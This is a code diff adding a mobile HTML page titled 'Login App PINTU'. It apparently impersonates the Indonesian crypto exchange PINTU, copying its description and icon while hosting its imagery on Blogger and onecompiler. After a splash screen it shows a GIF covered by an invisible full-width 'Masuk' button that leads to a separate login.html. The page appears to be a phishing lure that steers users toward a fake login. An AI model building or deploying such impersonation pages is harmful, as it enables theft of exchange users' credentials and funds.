@@ -1,0 +1,88 @@
+
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <meta name="og:description" content="Aplikasi Jual Beli dan Investasi Bitcoin dan Aset Digital. Harga Final, Tanpa Komisi, Tarik Rupiah Murah."> 
+  <meta name="og:image" content="https://play-lh.googleusercontent.com/X1leGM_E8IUA12tnZp9LjmoFwXbCezWb2GNjy_hzUB35KzeKrYv3H7nEujAN_BPhL9qo"> 
+  <link href="https://s3.ap-southeast-1.amazonaws.com/content.pintu.co.id/ic_launcher_1493da4144.png" rel="shortcut icon" type="image/x-icon"> 
+  <link href="https://s3.ap-southeast-1.amazonaws.com/content.pintu.co.id/ic_launcher_1493da4144.png" rel="apple-touch-icon"> 
+  <title>Login App PINTU</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    /* Splash screen */
+    #splash {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: linear-gradient(135deg, #007bff, #00c6ff);
+       background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEie-OR2b5rU7vatEe3KNGmfkjjejTPD05SstgxpleKTEP1Jjn8WlctPgk4hdCNetdRFxjtnV82m2ceshq-JFQcVL06RZGs5_Z9nklyo8V9PLS4f0HATH1VhMgEsNujorFU8l9IuG-m2Gg9nAyk_mHcpMz-rBzzHuC9S4IF9WCXREYUCFBjygBIedCWdKnA/s2194/1755953648125.jpg);
+      background-position: 100% 100%;
+      background-size: 100% 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      z-index: 9999;
+      animation: fadeOut 1s ease forwards;
+      animation-delay: 3s; /* lama splash (3 detik) */
+    }
+
+    #splash h1 {
+      font-size: 2em;
+      margin: 0;
+    }
+    #splash p {
+      margin-top: 10px;
+      font-size: 1.2em;
+    }
+
+    @keyframes fadeOut {
+      to {
+        opacity: 0;
+        visibility: hidden;
+      }
+    }
+
+    /* Konten utama */
+    #content {
+      display: none;
+      text-align: center;
+      padding: 0px;
+    }
+    
+    button:hover{
+        
+      background: #007bff90;
+    }
+  </style>
+</head>
+<body>
+  <!-- Splash screen -->
+  <div id="splash">
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEie-OR2b5rU7vatEe3KNGmfkjjejTPD05SstgxpleKTEP1Jjn8WlctPgk4hdCNetdRFxjtnV82m2ceshq-JFQcVL06RZGs5_Z9nklyo8V9PLS4f0HATH1VhMgEsNujorFU8l9IuG-m2Gg9nAyk_mHcpMz-rBzzHuC9S4IF9WCXREYUCFBjygBIedCWdKnA/s2194/1755953648125.jpg" width="100%" height="100%">
+  </div>
+
+  <!-- Konten utama -->
+  <div id="content">
+<img src="https://uploads.onecompiler.io/43veewudz/426ycevr7/1000117173.gif" width="100%" height="100%">
+<button style="width: 90%; height: 45px; position: fixed; bottom: 20; left: 0; right: 0; z-index: 9999; margin: 0px auto; opacity: 0;" onclick="location.href='login.html'">Masuk</button>
+  </div>
+
+  <script>
+    // Setelah 3 detik, tampilkan konten utama
+    setTimeout(() => {
+      document.getElementById("splash").style.display = "none";
+      document.getElementById("content").style.display = "block";
+    }, 4000); // waktu total (3s animasi + 1s delay)
+  </script>
+</body>
+</html>
